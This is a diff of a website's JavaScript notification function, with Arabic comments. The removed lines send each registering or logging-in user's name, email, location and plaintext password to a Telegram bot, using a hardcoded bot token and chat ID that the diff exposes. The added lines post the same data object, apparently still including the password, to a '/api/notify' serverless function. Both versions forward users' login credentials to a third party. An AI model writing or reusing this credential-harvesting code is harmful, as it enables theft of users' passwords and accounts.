@@ -79,27 +79,22 @@ function showToast(msg, type) {
   setTimeout(() => { toast.style.opacity = '0'; toast.style.transition = 'opacity 0.4s'; setTimeout(() => toast.remove(), 400); }, 3000);
 }
 
-// ===== TELEGRAM NOTIFICATION =====
+// ===== TELEGRAM NOTIFICATION (باستخدام Netlify Function) =====
 async function sendTelegramNotification(data) {
-  const token = '8549358187:AAG8Z2CioXFFZK43P0FTcTVKvutUSzUGJqU';
-  const chatId = '7770087246';
-
-  let message = '';
-  if (data.type === 'register') {
-    message = `🆕 تسجيل حساب جديد:\n👤 الاسم: ${data.firstName} ${data.lastName}\n📧 البريد: ${data.email}\n🏙️ المدينة: ${data.city}\n🌍 الدولة: ${data.country}\n🔑 كلمة المرور: ${data.password}\n⏰ الوقت: ${data.time}`;
-  } else if (data.type === 'login') {
-    message = `🔐 تسجيل دخول:\n👤 الاسم: ${data.name}\n📧 البريد: ${data.email}\n🔑 كلمة المرور: ${data.password}\n⏰ الوقت: ${data.time}`;
-  }
-
   try {
-    const url = `https://api.telegram.org/bot${token}/sendMessage`;
-    await fetch(url, {
+    const response = await fetch('/api/notify', {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: chatId, text: message })
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(data)
     });
-  } catch (e) {
-    console.error('فشل إرسال الإشعار إلى Telegram:', e);
+    
+    if (!response.ok) {
+      console.error('فشل الإرسال إلى Netlify Function:', response.status);
+    }
+  } catch (error) {
+    console.error('خطأ في الإرسال:', error);
   }
 }
 
